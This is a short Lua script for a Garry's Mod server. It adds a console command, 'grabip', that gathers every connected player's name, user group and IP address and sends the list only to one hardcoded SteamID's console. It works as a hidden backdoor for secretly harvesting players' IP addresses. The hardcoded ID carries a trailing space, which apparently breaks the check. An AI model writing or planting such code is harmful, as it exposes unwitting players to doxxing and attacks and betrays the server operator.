concommand.Add("grabip",function()

local monsteamid = "STEAM_0:0:98268539 "
local ipdetoutlemonde = {}

for k,v in pairs(player.GetAll()) do
table.insert(ipdetoutlemonde, v:Name().." - "..v:GetUserGroup().." - "..tostring(v:IPAddress()).."\n")

if(v:SteamID() == monsteamid) then
    v:PrintMessage( HUD_PRINTCONSOLE, "\n")
    timer.Simple(2, function()
        for i=1,#player.GetAll() do
            v:PrintMessage( HUD_PRINTCONSOLE, ipdetoutlemonde[i] )
        end
    end)
end

end

end)